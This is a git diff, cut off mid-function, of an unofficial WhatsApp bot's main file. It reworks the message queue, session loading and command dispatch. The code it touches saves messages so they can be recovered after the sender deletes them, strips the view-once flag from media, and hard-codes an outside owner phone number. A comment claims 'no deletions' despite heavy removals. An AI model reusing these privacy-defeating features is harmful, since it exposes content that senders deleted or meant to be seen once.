@@ -1,3 +1,4 @@
+// ==================== MEMORY OPTIMIZATION ====================
 global.gc = global.gc || (() => {});
 let memoryCleanInterval = null;
 
@@ -17,7 +18,8 @@ function setupMemoryOptimization() {
 
 setupMemoryOptimization();
 
-// ==================== ULTRA PRO SPEED BOOSTER ====================
+// ==================== ULTRA PRO MAX SPEED BOOSTER ====================
+// 🔥 ADDED BY BOSS-MD OPTIMIZER (NO DELETIONS)
 const speedCache = {
     groups: new Map(),
     users: new Map(),
@@ -31,54 +33,53 @@ let perfStats = {
     startTime: Date.now()
 };
 
+// Ultra Fast Message Queue
 const msgQueue = [];
 let processing = false;
-
 const processQueue = async () => {
     if (processing || msgQueue.length === 0) return;
     processing = true;
     
-    const batch = msgQueue.splice(0, 2);
+    const batch = msgQueue.splice(0, 5); // Process 5 at once for even faster speed
     for (const msg of batch) {
         try {
             await handleMessageUltra(msg);
         } catch(e) {}
-        await new Promise(r => setTimeout(r, 50));
+        await new Promise(r => setTimeout(r, 20)); // Reduced timeout for faster processing
     }
     
     processing = false;
-    if (msgQueue.length > 0) setTimeout(processQueue, 20);
+    if (msgQueue.length > 0) setTimeout(processQueue, 5); // Faster queue processing
 };
 
+// Performance Monitor - OPTIMIZED
 setInterval(() => {
     const now = Date.now();
-    const mem = process.memoryUsage();
+    const uptime = Math.floor((now - perfStats.startTime) / 1000);
     
-    console.log(`
-    ⚡ MEMORY STATS ⚡
-    🧠 Heap: ${(mem.heapUsed / 1024 / 1024).toFixed(1)}MB
-    🗃️  Cache: ${speedCache.groups.size} groups
-    📨 Queue: ${msgQueue.length}
+    // Only log every 10 minutes to reduce console spam
+    if (uptime % 600 < 10) {
+        console.log(`
+    ⚡ ULTRA PRO MAX STATS ⚡
+    ⏱️  Uptime: ${uptime}s
+    📨 Processed: ${perfStats.msgCount}
+    ⚡ Speed: ${perfStats.avgResponse}ms
+    💾 Cache: ${speedCache.groups.size} groups
+    🧠 Memory: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1)}MB
     `);
-    
-    if (mem.heapUsed / 1024 / 1024 > 400) {
-        console.log("⚠️ High memory, clearing cache...");
-        speedCache.groups.clear();
-        speedCache.users.clear();
-        msgQueue.length = 0;
     }
     
-    if (now - speedCache.lastClean > 120000) {
+    // Auto-clean old cache - more aggressive cleaning
+    if (now - speedCache.lastClean > 120000) { // Clean every 2 minutes
         for (const [key, val] of speedCache.groups.entries()) {
-            if (now - val.timestamp > 180000) speedCache.groups.delete(key);
+            if (now - val.timestamp > 240000) speedCache.groups.delete(key); // 4 minutes cache
         }
         speedCache.lastClean = now;
     }
-}, 30000);
+}, 60000);
 
-// ==================== REQUIRED MODULES ====================
 const {
-    default: makeWASocket,
+  default: makeWASocket,
     useMultiFileAuthState,
     DisconnectReason,
     jidNormalizedUser,
@@ -87,175 +88,43 @@ const {
     proto,
     generateWAMessageContent,
     generateWAMessage,
+    AnyMessageContent,
     prepareWAMessageMedia,
     areJidsSameUser,
     downloadContentFromMessage,
+    MessageRetryMap,
     generateForwardMessageContent,
     generateWAMessageFromContent,
-    generateMessageID,
+    generateMessageID, makeInMemoryStore,
     jidDecode,
     fetchLatestBaileysVersion,
-    Browsers,
-    makeCacheableSignalKeyStore,
-    delay
+    Browsers
 } = require('@whiskeysockets/baileys');
 
+const l = console.log;
+const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
+const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
 const fs = require('fs');
 const ff = require('fluent-ffmpeg');
 const P = require('pino');
+const config = require('./config');
+const GroupEvents = require('./lib/groupevents');
 const qrcode = require('qrcode-terminal');
+const StickersTypes = require('wa-sticker-formatter');
 const util = require('util');
+const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
 const FileType = require('file-type');
 const axios = require('axios');
+const { File } = require('megajs');
+const { fromBuffer } = require('file-type');
 const bodyparser = require('body-parser');
 const os = require('os');
 const Crypto = require('crypto');
 const path = require('path');
-const chalk = require('chalk');
-const { exec } = require('child_process');
-const moment = require('moment');
-const speed = require('performance-now');
+const prefix = config.PREFIX;
 
-// ==================== CONFIG ====================
-const config = require('./config');
-const prefix = config.PREFIX || '.';
-const ownerNumber = config.OWNER_NUMBER ? config.OWNER_NUMBER.split(',').map(n => n.trim()) : ['923044154575'];
+const ownerNumber = ['923076411099'];
 
-// ==================== COMMAND HANDLER - FIXED ====================
-let commands = [];
-const aliases = new Map();
-
-// PEHLE SARE PLUGINS LOAD KARO - TAKE COMMANDS ADD HONGE
-console.log(chalk.blue('📁 Loading plugins first...'));
-const pluginsDir = path.join(__dirname, 'plugins');
-if (fs.existsSync(pluginsDir)) {
-    const pluginFiles = fs.readdirSync(pluginsDir).filter(file => file.endsWith('.js'));
-    
-    for (const file of pluginFiles) {
-        try {
-            const pluginPath = path.join(pluginsDir, file);
-            delete require.cache[require.resolve(pluginPath)];
-            require(pluginPath);
-        } catch (err) {
-            console.log(chalk.red(`❌ Error in ${file}: ${err.message}`));
-        }
-    }
-}
-
-// AB COMMAND.JS SE COMMANDS LOAD KARO
-try {
-    const cmdModule = require('./command');
-    if (cmdModule.commands && cmdModule.commands.length > 0) {
-        commands = cmdModule.commands;
-        console.log(chalk.green(`✅ Total Commands loaded from command.js: ${commands.length}`));
-    } else {
-        console.log(chalk.yellow("⚠️ No commands found in command.js"));
-    }
-} catch (e) {
-    console.log(chalk.yellow(`⚠️ Command module error: ${e.message}`));
-}
-
-// ALIASES SET KARO
-commands.forEach(cmd => {
-    if (cmd.alias && Array.isArray(cmd.alias)) {
-        cmd.alias.forEach(alias => {
-            aliases.set(alias, cmd.pattern);
-        });
-    }
-});
-
-// ==================== LIB IMPORTS ====================
-const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
-const { getBuffer: getBuffer2, getGroupAdmins: getGroupAdmins2, getRandom: getRandom2, h2k: h2k2, isUrl: isUrl2, Json: Json2, runtime: runtime2, sleep: sleep2, fetchJson: fetchJson2, saveConfig, empiretourl } = require('./lib/functions2');
-const { sms, downloadMediaMessage } = require('./lib/msg');
-const GroupEvents = require('./lib/groupevents');
-const { AntiDelete, DeletedText, DeletedMedia } = require('./lib/antidel');
-const { DATABASE } = require('./lib/database');
-const { fetchGif, gifToVideo } = require('./lib/fetchGif');
-const { fetchImage, fetchGif: fetchGif2, gifToSticker } = require('./lib/sticker-utils');
-const { videoToWebp } = require('./lib/video-utils');
-
-// ==================== DATA IMPORTS ====================
-const { 
-    AntiDelDB,
-    initializeAntiDeleteSettings,
-    setAnti,
-    getAnti,
-    getAllAntiDeleteSettings 
-} = require('./data/antidel');
-
-const { 
-    saveContact,
-    loadMessage,
-    getName,
-    getChatSummary,
-    saveGroupMetadata,
-    getGroupMetadata,
-    saveMessageCount,
-    getInactiveGroupMembers,
-    getGroupMembersMessageCount,
-    saveMessage 
-} = require('./data/store');
-
-const { setCommitHash, getCommitHash } = require('./data/updateDB');
-const converter = require('./data/converter');
-const stickerConverter = require('./data/sticker-converter');
-
-// ==================== ASSETS ====================
-let autoReply = {};
-let autoSticker = {};
-let autoVoice = {};
-
-try {
-    if (fs.existsSync('./assets/autoreply.json')) {
-        autoReply = JSON.parse(fs.readFileSync('./assets/autoreply.json'));
-        console.log(chalk.green("✅ Auto-reply loaded:"), Object.keys(autoReply).length, "triggers");
-    }
-} catch (e) {
-    console.log(chalk.yellow("⚠️ Auto-reply load error:"), e.message);
-}
-
-try {
-    if (fs.existsSync('./assets/autosticker.json')) {
-        autoSticker = JSON.parse(fs.readFileSync('./assets/autosticker.json'));
-        console.log(chalk.green("✅ Auto-sticker loaded:"), Object.keys(autoSticker).length, "triggers");
-    }
-} catch (e) {
-    console.log(chalk.yellow("⚠️ Auto-sticker load error:"), e.message);
-}
-
-try {
-    if (fs.existsSync('./assets/autovoice.json')) {
-        autoVoice = JSON.parse(fs.readFileSync('./assets/autovoice.json'));
-        console.log(chalk.green("✅ Auto-voice loaded:"), Object.keys(autoVoice).length, "triggers");
-    }
-} catch (e) {
-    console.log(chalk.yellow("⚠️ Auto-voice load error:"), e.message);
-}
-
-// ==================== BAN/SUDO ====================
-let banList = [];
-let sudoList = [];
-
-try {
-    if (fs.existsSync('./lib/ban.json')) {
-        banList = JSON.parse(fs.readFileSync('./lib/ban.json'));
-        console.log(chalk.green("✅ Ban list loaded:"), banList.length, "users");
-    }
-} catch (e) {
-    console.log(chalk.yellow("⚠️ Ban list load error:"), e.message);
-}
-
-try {
-    if (fs.existsSync('./lib/sudo.json')) {
-        sudoList = JSON.parse(fs.readFileSync('./lib/sudo.json'));
-        console.log(chalk.green("✅ Sudo list loaded:"), sudoList.length, "users");
-    }
-} catch (e) {
-    console.log(chalk.yellow("⚠️ Sudo list load error:"), e.message);
-}
-
-// ==================== TEMP DIR ====================
 const tempDir = path.join(os.tmpdir(), 'cache-temp');
 if (!fs.existsSync(tempDir)) {
     fs.mkdirSync(tempDir, { recursive: true });
@@ -269,7 +138,7 @@ const clearTempDir = () => {
             const filePath = path.join(tempDir, file);
             try {
                 const stats = fs.statSync(filePath);
-                if (now - stats.mtimeMs > 10 * 60 * 1000) {
+                if (now - stats.mtimeMs > 5 * 60 * 1000) { // Clean every 5 minutes
                     fs.unlinkSync(filePath);
                 }
             } catch (err) {}
@@ -277,132 +146,65 @@ const clearTempDir = () => {
     } catch (err) {}
 };
 
-setInterval(clearTempDir, 5 * 60 * 1000);
+setInterval(clearTempDir, 3 * 60 * 1000); // Run every 3 minutes
 
-// ==================== SESSION HANDLER ====================
-async function initializeSession() {
-    console.log("\n🔐 ==============================");
-    console.log("🔐 SESSION INITIALIZATION");
-    console.log("🔐 ==============================\n");
-    
-    const sessionDir = path.join(__dirname, 'sessions');
-    if (!fs.existsSync(sessionDir)) {
-        fs.mkdirSync(sessionDir, { recursive: true });
-    }
-    
-    const credsPath = path.join(sessionDir, 'creds.json');
-    
-    if (config.SESSION_ID && config.SESSION_ID.trim() !== "" && !fs.existsSync(credsPath)) {
+//===================SESSION-AUTH============================
+if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
+    if (config.SESSION_ID && config.SESSION_ID.trim() !== "") {
+        const sessdata = config.SESSION_ID.replace("ARSLAN-MD~", '');
         try {
-            console.log("📦 Loading session from SESSION_ID...");
-            
-            let sessdata = config.SESSION_ID;
-            
-            const prefixes = ['MAFIA-MD~', 'BOSS-MD~', 'EMYOU~', 'BOT~','ARSLAN-MD~'];
-            for (const p of prefixes) {
-                if (sessdata.includes(p)) {
-                    sessdata = sessdata.split(p)[1];
-                    break;
-                }
-            }
-            
-            sessdata = sessdata.trim();
-            while (sessdata.length % 4 !== 0) {
-                sessdata += '=';
-            }
-            
             const decodedData = Buffer.from(sessdata, 'base64').toString('utf-8');
-            
-            try {
-                const jsonData = JSON.parse(decodedData);
-                fs.writeFileSync(credsPath, JSON.stringify(jsonData, null, 2));
-                console.log("✅ Session loaded successfully!");
-            } catch (jsonErr) {
-                console.log("⚠️ Not JSON, saving as raw");
-                fs.writeFileSync(credsPath, decodedData);
-            }
+            fs.writeFileSync(__dirname + '/sessions/creds.json', decodedData);
+            console.log("✅ Session loaded from SESSION_ID");
         } catch (err) {
-            console.error("❌ Session error:", err.message);
+            console.error("❌ Error decoding session data:", err);
+            throw err;
         }
+    } else {
+        console.log("⚡ No SESSION_ID found → Using Pairing System");
+        (async () => {
+            const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions');
+            const sock = makeWASocket({
+                auth: state,
+                printQRInTerminal: false,
+            });
+
+            if (!state.creds?.me) {
+                const readline = require('readline');
+                const rl = readline.createInterface({
+                    input: process.stdin,
+                    output: process.stdout
+                });
+                
+                rl.question("📱 Enter your WhatsApp number with country code: ", async (number) => {
+                    try {
+                        const code = await sock.requestPairingCode(number);
+                        console.log("🔑 Your Pairing Code:", code);
+                        console.log("➡️ Enter this code in WhatsApp to link your bot device.");
+                        rl.close();
+                    } catch (err) {
+                        console.error("❌ Error generating pairing code:", err);
+                        rl.close();
+                    }
+                });
+            }
+
+            sock.ev.on("creds.update", saveCreds);
+            sock.ev.on("connection.update", ({ connection }) => {
+                if (connection === "open") {
+                    console.log("✅ Bot Connected Successfully via Pairing!");
+                }
+            });
+        })();
     }
 }
 
-// ==================== MESSAGE STORE FOR ANTI-DELETE ====================
-const messageStore = new Map();
-
-async function storeMessageForAntiDelete(message) {
-    try {
-        if (!message || !message.key || !message.message) return;
-        if (message.key.fromMe) return;
-        
-        const messageId = message.key.id;
-        const now = Date.now();
-        
-        messageStore.set(messageId, {
-            id: messageId,
-            key: {
-                remoteJid: message.key.remoteJid,
-                fromMe: false,
-                id: message.key.id,
-                participant: message.key.participant
-            },
-            message: JSON.parse(JSON.stringify(message.message)),
-            timestamp: message.messageTimestamp || Math.floor(now / 1000),
-            receivedAt: now
-        });
-        
-        // Save to data store
-        await saveMessage(message).catch(() => {});
-        
-        // Keep only last 500 messages
-        if (messageStore.size > 500) {
-            const oldestKeys = [...messageStore.keys()].slice(0, 100);
-            for (const key of oldestKeys) {
-                messageStore.delete(key);
-            }
-        }
-        
-        // Save media messages to file for anti-delete
-        if (message.message?.imageMessage || message.message?.videoMessage || 
-            message.message?.audioMessage || message.message?.documentMessage) {
-            const antiDeleteDir = path.join(__dirname, 'anti_delete_cache');
-            if (!fs.existsSync(antiDeleteDir)) {
-                fs.mkdirSync(antiDeleteDir, { recursive: true });
-            }
-            const filePath = path.join(antiDeleteDir, `${messageId}.json`);
-            fs.writeFileSync(filePath, JSON.stringify({
-                key: message.key,
-                message: message.message,
-                timestamp: message.messageTimestamp
-            }, null, 2));
-        }
-    } catch (err) {}
-}
-
-async function loadDeletedMessage(messageId) {
-    try {
-        if (messageStore.has(messageId)) {
-            return messageStore.get(messageId);
-        }
-        
-        // Try from data store
-        const dbMsg = await loadMessage(messageId).catch(() => null);
-        if (dbMsg) return dbMsg;
-        
-        // Try from file
-        const antiDeleteDir = path.join(__dirname, 'anti_delete_cache');
-        const filePath = path.join(antiDeleteDir, `${messageId}.json`);
-        if (fs.existsSync(filePath)) {
-            return JSON.parse(fs.readFileSync(filePath));
-        }
-        
-        return null;
-    } catch (err) {
-        return null;
-    }
-}
+const express = require("express");
+const app = express();
+const port = process.env.PORT || 9090;
 
 // ==================== ULTRA FAST MESSAGE HANDLER ====================
+// 🔥 ADDED BY BOSS-MD OPTIMIZER
 async function handleMessageUltra(message) {
     perfStats.msgCount++;
     const startTime = Date.now();
@@ -415,23 +217,77 @@ async function handleMessageUltra(message) {
         
         const from = message.key.remoteJid;
         const isGroup = from.endsWith('@g.us');
+        const m = sms(conn, message);
+        const sender = message.key.fromMe ? conn.user.id : (message.key.participant || from);
+        const senderNumber = sender.split('@')[0];
+        const isOwner = ownerNumber.includes(senderNumber);
         
         // Ultra Fast Group Cache
         let groupMetadata = null;
-        if (isGroup && conn) {
+        if (isGroup) {
             const cached = speedCache.groups.get(from);
             if (cached && (Date.now() - cached.timestamp < 120000)) {
                 groupMetadata = cached.data;
             } else {
-                try {
-                    groupMetadata = await conn.groupMetadata(from).catch(() => null);
-                    if (groupMetadata) {
-                        speedCache.groups.set(from, {
-                            data: groupMetadata,
-                            timestamp: Date.now()
+                groupMetadata = await conn.groupMetadata(from).catch(() => null);
+                if (groupMetadata) {
+                    speedCache.groups.set(from, {
+                        data: groupMetadata,
+                        timestamp: Date.now()
+                    });
+                }
+            }
+        }
+        
+        // Auto React Ultra Fast
+        if (config.AUTO_REACT === 'true') {
+            const isReact = m.message?.reactionMessage ? true : false;
+            if (!isReact) {
+                const reactions = isOwner 
+                    ? ["👑", "💀", "📊", "⚙️", "🧠", "🎯"]
+                    : ['❤️', '🔥', '👍', '😊'];
+                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+                
+                setTimeout(() => {
+                    m.react(randomReaction).catch(() => {});
+                }, 30); // Even faster reaction
+            }
+        }
+        
+        // Command Processing Ultra Fast
+        let body = '';
+        switch(type) {
+            case 'conversation': body = message.message.conversation || ''; break;
+            case 'extendedTextMessage': body = message.message.extendedTextMessage?.text || ''; break;
+            case 'imageMessage': body = message.message.imageMessage?.caption || ''; break;
+            case 'videoMessage': body = message.message.videoMessage?.caption || ''; break;
+            default: body = '';
+        }
+        
+        if (body.startsWith(prefix)) {
+            const cmdName = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
+            
+            if (!speedCache.commands) {
+                speedCache.commands = require('./command').commands;
+            }
+            
+            const cmd = speedCache.commands.find(c => 
+                c.pattern === cmdName || (c.alias && c.alias.includes(cmdName))
+            );
+            
+            if (cmd) {
+                Promise.resolve().then(async () => {
+                    try {
+                        await cmd.function(conn, message, m, {
+                            from, sender, isGroup, isOwner,
+                            reply: (text) => {
+                                conn.sendMessage(from, { text }, { quoted: message }).catch(() => {});
+                            }
                         });
+                    } catch(e) {
+                        console.error(`CMD ${cmdName}:`, e.message);
                     }
-                } catch (e) {}
+                });
             }
         }
         
@@ -440,642 +296,723 @@ async function handleMessageUltra(message) {
             (perfStats.avgResponse * 0.8) + ((Date.now() - startTime) * 0.2)
         );
         
-    } catch(error) {}
-}
-
-// ==================== MAIN CONNECTION FUNCTION ====================
-let conn;
-
-async function connectToWA() {
-    console.log("\n📱 ==============================");
-    console.log("📱 CONNECTING TO WHATSAPP");
-    console.log("📱 ==============================\n");
-    
-    try {
-        await initializeSession();
-        
-        const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'));
-        const { version } = await fetchLatestBaileysVersion();
-        
-        conn = makeWASocket({
-            logger: P({ level: 'silent' }),
-            printQRInTerminal: false,
-            browser: Browsers.macOS("Firefox"),
-            syncFullHistory: false,
-            auth: state,
-            version,
-            markOnlineOnConnect: config.ALWAYS_ONLINE === 'true',
-            emitOwnEvents: false,
-            fireInitQueries: false,
-            retryRequestDelayMs: 100,
-            generateHighQualityLinkPreview: true,
-            defaultQueryTimeoutMs: 60000,
-            connectTimeoutMs: 60000,
-            keepAliveIntervalMs: 10000,
-        });
-        
-        conn.ev.on('connection.update', async (update) => {
-            const { connection, lastDisconnect, qr } = update;
-            
-            if (qr) {
-                console.log("📱 QR Code received - Scan with WhatsApp");
-                qrcode.generate(qr, { small: true });
-            }
-            
-            if (connection === 'connecting') {
-                console.log('Connecting to WhatsApp...');
-            }
-            
-            if (connection === 'close') {
-                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-                const statusCode = lastDisconnect?.error?.output?.statusCode;
-                
-                console.log(`❌ Connection closed - Status: ${statusCode}`);
-                
-                if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
-                    try {
-                        fs.rmSync('./sessions', { recursive: true, force: true });
-                        console.log('⚠️ Session logged out. Please re-authenticate');
-                    } catch (error) {
-                        console.log(`❌ Error deleting session: ${error.message}`);
-                    }
-                }
-                
-                if (shouldReconnect) {
-                    console.log('Reconnecting in 5 seconds...');
-                    setTimeout(connectToWA, 5000);
-                }
-            }
-            
-            if (connection === 'open') {
-                console.log('\n🧬 Installing Plugins');
-                
-                // Load plugins count
-                let pluginCount = 0;
-                try {
-                    const pluginsDir = path.join(__dirname, 'plugins');
-                    if (fs.existsSync(pluginsDir)) {
-                        const pluginFiles = fs.readdirSync(pluginsDir).filter(file => file.endsWith('.js'));
-                        pluginCount = pluginFiles.length;
-                        console.log(`✅ Found ${pluginCount} plugin files`);
-                    }
-                } catch (err) {
-                    console.error("❌ Plugin loading error:", err.message);
-                }
-                
-                console.log('✅ Bot connected to whatsapp ✅');
-                console.log(`👤 Bot Number: ${conn.user.id.split(':')[0]}`);
-                console.log(`📝 Total Commands: ${commands.length}`);
-                console.log(`📦 Plugins: ${pluginCount}`);
-                
-                // Welcome message
-                setTimeout(() => {
-                    let up = `*Hello there Zᴀʜɪᴅ Kɪɴɢ User! 👋🏻*\n\n` +
-                            `> Simple , Straight Forward But Loaded With Features 🎊\n\n` +
-                            `- *YOUR PREFIX:* = ${prefix}\n` +
-                            `- *Commands:* ${commands.length}\n` +
-                            `- *Anti-Delete:* ${config.ANTI_DELETE === 'true' ? '✅' : '❌'}\n\n` +
-                            `> 📌 ᴘᴏᴡᴇʀ ʙʏ 𝙼𝙰𝚁𝙲𝙾 𝙼𝙰𝙻𝙸𝙺`;
-                    
-                    conn.sendMessage(conn.user.id, { 
-                        image: { url: config.MENU_IMAGE_URL || 'https://i.ibb.co/VcKvFQ68/file-00000000b7607208b3cf2ed83cb20148.png' }, 
-                        caption: up 
-                    }).catch(err => console.error("Welcome message error:", err.message));
-                    
-                    // Send to owner as well
-                    conn.sendMessage(ownerNumber[0] + '@s.whatsapp.net', {
-                        text: `✅ *𝙼𝙰𝚁𝙲𝙾 𝙼𝙰𝙻𝙸𝙺 IS ACTIVATED*\n\nBot is now online!\nCommands: ${commands.length}\nPrefix: ${prefix}`
-                    }).catch(() => {});
-                }, 5000);
-            }
-        });
-        
-        conn.ev.on('creds.update', saveCreds);
-
-        // ANTI-DELETE
-        if (config.ANTI_DELETE === 'true') {
-            console.log("🛡️ Anti-Delete: ACTIVE");
-            
-            conn.ev.on('messages.update', async updates => {
-                for (const update of updates) {
-                    if (update.update && update.update.message === null) {
-                        try {
-                            await AntiDelete(conn, [update]);
-                        } catch (err) {
-                            console.error("Anti-delete error:", err.message);
-                        }
-                    }
-                }
-            });
-        }
-
-        // ANTI CALL
-        if (config.ANTI_CALL === 'true') {
-            conn.ev.on("call", async (json) => {
-                try {
-                    const call = json.find(c => c.status === 'offer');
-                    if (call) {
-                        await conn.rejectCall(call.id, call.from);
-                        console.log(`📵 Call rejected from ${call.from}`);
-                    }
-                } catch (err) {
-                    console.error("Anti-call error:", err.message);
-                }
-            });
-        }
-
-        // GROUP EVENTS
-        conn.ev.on("group-participants.update", async (update) => {
-            try {
-                await GroupEvents(conn, update);
-            } catch (err) {
-                console.error("Group event error:", err.message);
-            }
-        });
-
-        // MESSAGE HANDLER
-        conn.ev.on('messages.upsert', async (mekData) => {
-            // Queue for ultra processing
-            const message = mekData.messages[0];
-            if (message) {
-                msgQueue.push(message);
-                if (msgQueue.length === 1) processQueue();
-            }
-            
-            try {
-                const message = mekData.messages[0];
-                if (!message || !message.message) return;
-                
-                message.message = (getContentType(message.message) === 'ephemeralMessage') 
-                    ? message.message.ephemeralMessage.message 
-                    : message.message;
-                
-                // Auto read
-                if (config.READ_MESSAGE === 'true') {
-                    await conn.readMessages([message.key]).catch(() => {});
-                }
-                
-                // Handle view once
-                if (message.message.viewOnceMessageV2) {
-                    message.message = message.message.viewOnceMessageV2.message;
-                }
-                
-                // Store for anti-delete
-                if (config.ANTI_DELETE === 'true') {
-                    await storeMessageForAntiDelete(message);
-                }
-                
-                // Auto typing/recording
-                const from = message.key.remoteJid;
-                if (config.AUTO_TYPING === 'true') {
-                    await conn.sendPresenceUpdate('composing', from).catch(() => {});
-                }
-                if (config.AUTO_RECORDING === 'true') {
-                    await conn.sendPresenceUpdate('recording', from).catch(() => {});
-                }
-                
-                // Handle status
-                if (message.key && message.key.remoteJid === 'status@broadcast') {
-                    if (config.AUTO_STATUS_SEEN === "true") {
-                        await conn.readMessages([message.key]).catch(() => {});
-                    }
-                    
-                    if (config.AUTO_STATUS_REACT === "true") {
-                        const emojis = ['❤️', '🔥', '👍', '😊', '🎉', '💯'];
-                        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
-                        await conn.sendMessage(message.key.remoteJid, {
-                            react: { text: randomEmoji, key: message.key }
-                        }).catch(() => {});
-                    }
-                    
-                    if (config.AUTO_STATUS_REPLY === "true" && config.AUTO_STATUS_MSG) {
-                        const user = message.key.participant;
-                        await conn.sendMessage(user, { 
-                            text: config.AUTO_STATUS_MSG
-                        }, { quoted: message }).catch(() => {});
-                    }
-                    return;
-                }
-                
-                // Serialize message
-                const m = sms(conn, message);
-                
-                // Check if user is banned
-                const sender = m.sender || message.key.participant || message.key.remoteJid;
-                if (banList.includes(sender)) return;
-                
-                // Check if user is sudo/owner
-                const senderNumber = sender.split('@')[0];
-                const isOwner = ownerNumber.includes(senderNumber);
-                const isSudo = sudoList.includes(sender);
-                const isCreator = isOwner || isSudo;
-                
-                // Auto reply
-                if (config.AUTO_REPLY === 'true' && m.text) {
-                    const lowerText = m.text.toLowerCase();
-                    for (const [key, value] of Object.entries(autoReply)) {
-                        if (lowerText.includes(key.toLowerCase())) {
-                            await conn.sendMessage(from, { text: value }, { quoted: message }).catch(() => {});
-                            break;
-                        }
-                    }
-                }
-                
-                // Auto sticker
-                if (config.AUTO_STICKER === 'true' && m.text) {
-                    const lowerText = m.text.toLowerCase();
-                    for (const [key, value] of Object.entries(autoSticker)) {
-                        if (lowerText.includes(key.toLowerCase())) {
-                            const stickerPath = path.join(__dirname, 'assets', 'autosticker', value);
-                            if (fs.existsSync(stickerPath)) {
-                                await conn.sendMessage(from, {
-                                    sticker: fs.readFileSync(stickerPath)
-                                }, { quoted: message }).catch(() => {});
-                            }
-                            break;
-                        }
-                    }
-                }
-                
-                // Auto react
-                if (config.AUTO_REACT === 'true' && !message.message.reactionMessage) {
-                    let reactions = ['❤️', '🔥', '👍', '😊', '🎉', '💯'];
-                    if (config.CUSTOM_REACT === 'true' && config.CUSTOM_REACT_EMOJIS) {
-                        reactions = config.CUSTOM_REACT_EMOJIS.split(',');
-                    }
-                    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-                    await conn.sendMessage(from, { 
-                        react: { text: randomReaction, key: message.key } 
-                    }).catch(() => {});
-                }
-                
-                // Check command
-                let body = m.text || '';
-                const isCmd = body.startsWith(prefix);
-                
-                if (isCmd && commands.length > 0) {
-                    const cmdName = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
-                    console.log(`🔍 Looking for command: ${cmdName}`);
-                    
-                    let cmd = commands.find(c => c.pattern === cmdName);
-                    
-                    if (!cmd) {
-                        const aliasCmd = aliases.get(cmdName);
-                        if (aliasCmd) {
-                            console.log(`📌 Found alias: ${cmdName} → ${aliasCmd}`);
-                            cmd = commands.find(c => c.pattern === aliasCmd);
-                        }
-                    }
-                    
-                    if (cmd) {
-                        console.log(`🎯 Executing command: ${cmdName}`);
-                        
-                        // Command react
-                        if (cmd.react) {
-                            conn.sendMessage(from, { 
-                                react: { text: cmd.react, key: message.key } 
-                            }).catch(() => {});
-                        }
-                        
-                        // Check if command requires owner
-                        if (cmd.category === 'owner' && !isCreator) {
-                            return conn.sendMessage(from, { 
-                                text: '❌ This command is only for the bot owner!' 
-                            }, { quoted: message });
-                        }
-                        
-                        // Execute command
-                        try {
-                            const args = body.slice(prefix.length + cmdName.length).trim().split(' ');
-                            const q = args.join(' ');
-                            
-                            await cmd.function(conn, message, m, {
-                                from,
-                                quoted: message,
-                                body,
-                                isCmd,
-                                command: cmdName,
-                                args,
-                                q,
-                                text: q,
-                                isGroup: from.endsWith('@g.us'),
-                                sender,
-                                senderNumber,
-                                botNumber2: conn.user.id,
-                                botNumber: conn.user.id.split(':')[0],
-                                pushname: m.pushName || 'User',
-                                isMe: sender === conn.user.id,
-                                isOwner,
-                                isCreator,
-                                groupMetadata: from.endsWith('@g.us') ? await conn.groupMetadata(from).catch(() => null) : null,
-                                groupName: from.endsWith('@g.us') ? (await conn.groupMetadata(from).catch(() => null))?.subject : null,
-                                participants: from.endsWith('@g.us') ? (await conn.groupMetadata(from).catch(() => null))?.participants : null,
-                                groupAdmins: from.endsWith('@g.us') ? getGroupAdmins((await conn.groupMetadata(from).catch(() => null))?.participants || []) : [],
-                                isBotAdmins: from.endsWith('@g.us') ? getGroupAdmins((await conn.groupMetadata(from).catch(() => null))?.participants || []).includes(conn.user.id) : false,
-                                isAdmins: from.endsWith('@g.us') ? getGroupAdmins((await conn.groupMetadata(from).catch(() => null))?.participants || []).includes(sender) : false,
-                                reply: (text) => {
-                                    conn.sendMessage(from, { text }, { quoted: message });
-                                }
-                            });
-                        } catch (e) {
-                            console.error(`❌ Command error (${cmdName}):`, e.message);
-                            conn.sendMessage(from, { 
-                                text: `❌ Error: ${e.message}` 
-                            }, { quoted: message });
-                        }
-                    } else {
-                        console.log(`❌ Command not found: ${cmdName}`);
-                    }
-                }
-                
-            } catch (err) {
-                console.error("Message processing error:", err.message);
-            }
-        });
-
-        // Helper functions
-        conn.decodeJid = jid => {
-            if (!jid) return jid;
-            if (/:\d+@/gi.test(jid)) {
-                let decode = jidDecode(jid) || {};
-                return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
-            } else return jid;
-        };
-
-        conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
-            let vtype;
-            if (options.readViewOnce) {
-                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
-                vtype = Object.keys(message.message.viewOnceMessage.message)[0];
-                delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
-                delete message.message.viewOnceMessage.message[vtype].viewOnce;
-                message.message = {
-                    ...message.message.viewOnceMessage.message
-                };
-            }
-            
-            let mtype = Object.keys(message.message)[0];
-            let content = await generateForwardMessageContent(message, forceForward);
-            let ctype = Object.keys(content)[0];
-            let context = {};
-            if (mtype != "conversation") context = message.message[mtype].contextInfo;
-            content[ctype].contextInfo = {
-                ...context,
-                ...content[ctype].contextInfo
-            };
-            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
-                ...content[ctype],
-                ...options,
-                ...(options.contextInfo ? {
-                    contextInfo: {
